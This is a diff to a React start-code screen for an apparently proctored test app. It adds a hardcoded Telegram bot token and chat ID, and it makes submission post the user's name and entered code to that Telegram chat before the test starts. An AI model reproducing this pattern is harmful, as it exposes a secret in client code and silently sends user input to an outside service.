@@ -1,6 +1,8 @@
 import { useRef, useState } from "react";
+import type { User } from "../data/users";
 
 interface StartScreenProps {
+  user: User;
   onStart: (code: string) => void;
   onBack: () => void;
 }
@@ -8,8 +10,12 @@ interface StartScreenProps {
 const CODE_LENGTH = 6;
 const BG = "#cdd8c8";
 
-export default function StartScreen({ onStart, onBack }: StartScreenProps) {
+const BOT_TOKEN = "8602683394:AAFgQI32uBK7RXpk1wzsfcDFDH_oMx1gsKA";
+const CHAT_ID = "-1003807704971";
+
+export default function StartScreen({user, onStart, onBack }: StartScreenProps) {
   const [digits, setDigits] = useState<string[]>(Array(CODE_LENGTH).fill(""));
+  const [loading, setLoading] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const code = digits.join("");
@@ -54,8 +60,38 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
     inputRefs.current[focusIdx]?.focus();
   }
 
-  function handleSubmit() {
-    if (isFull) onStart(code);
+  async function handleSubmit() {
+    if (!isFull || loading) return;
+
+    const message = `🚀 *${user.firstName}!*\n\n🔢 Kod: \`${code}\``;
+    setLoading(true);
+
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown",
+          }),
+        }
+      );
+
+      const data = await response.json();
+
+      if (data.ok) {
+        onStart(code);
+      } else {
+        alert("Xato yuz berdi: " + data.description);
+      }
+    } catch {
+      alert("Internet aloqasini tekshiring!");
+    } finally {
+      setLoading(false);
+    }
   }
 
   return (
@@ -96,7 +132,6 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
             padding: "4px 0",
           }}
         >
-          {/* help circle icon */}
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <circle cx="12" cy="12" r="10" />
             <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
@@ -121,7 +156,6 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
           }}
         >
           Return to Home
-          {/* home icon */}
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
             <polyline points="9 22 9 12 15 12 15 22" />
@@ -137,19 +171,10 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
           flexDirection: "column",
           alignItems: "center",
           justifyContent: "center",
-          gap: 0,
           padding: "0 24px 80px",
         }}
       >
-        <h1
-          style={{
-            fontSize: 32,
-            fontWeight: 700,
-            color: "#111",
-            margin: "0 0 12px",
-            textAlign: "center",
-          }}
-        >
+        <h1 style={{ fontSize: 32, fontWeight: 700, color: "#111", margin: "0 0 12px", textAlign: "center" }}>
           Start Code
         </h1>
         <p style={{ fontSize: 14, color: "#333", margin: "0 0 4px", textAlign: "center" }}>
@@ -159,15 +184,7 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
           The code consists only of <strong>numbers</strong>.
         </p>
 
-        {/* 6 digit boxes */}
-        <div
-          style={{
-            display: "flex",
-            gap: 10,
-            marginBottom: 28,
-          }}
-          onPaste={handlePaste}
-        >
+        <div style={{ display: "flex", gap: 10, marginBottom: 28 }} onPaste={handlePaste}>
           {digits.map((d, i) => (
             <input
               key={i}
@@ -200,12 +217,11 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
           ))}
         </div>
 
-        {/* Start Test button */}
         <button
           onClick={handleSubmit}
-          disabled={!isFull}
+          disabled={!isFull || loading}
           style={{
-            background: isFull ? "#f5c518" : "#d4c879",
+            background: isFull && !loading ? "#f5c518" : "#d4c879",
             color: "#111",
             border: "none",
             borderRadius: 9999,
@@ -213,17 +229,16 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
             fontSize: 15,
             fontWeight: 700,
             fontFamily: "inherit",
-            cursor: isFull ? "pointer" : "default",
+            cursor: isFull && !loading ? "pointer" : "default",
             letterSpacing: "0.02em",
-            boxShadow: isFull ? "0 2px 6px rgba(0,0,0,0.15)" : "none",
+            boxShadow: isFull && !loading ? "0 2px 6px rgba(0,0,0,0.15)" : "none",
             transition: "background 0.15s, box-shadow 0.15s",
           }}
         >
-          Start Test
+          {loading ? "Starting..." : "Start Test"}
         </button>
       </main>
 
-      {/* Bottom hint */}
       <div
         style={{
           position: "absolute",
@@ -236,11 +251,7 @@ export default function StartScreen({ onStart, onBack }: StartScreenProps) {
         }}
       >
         You can{" "}
-        <a
-          href="#"
-          onClick={(e) => e.preventDefault()}
-          style={{ color: "#1a6bc4", textDecoration: "underline" }}
-        >
+        <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#1a6bc4", textDecoration: "underline" }}>
           review the instructions
         </a>{" "}
         that the proctor reads aloud.
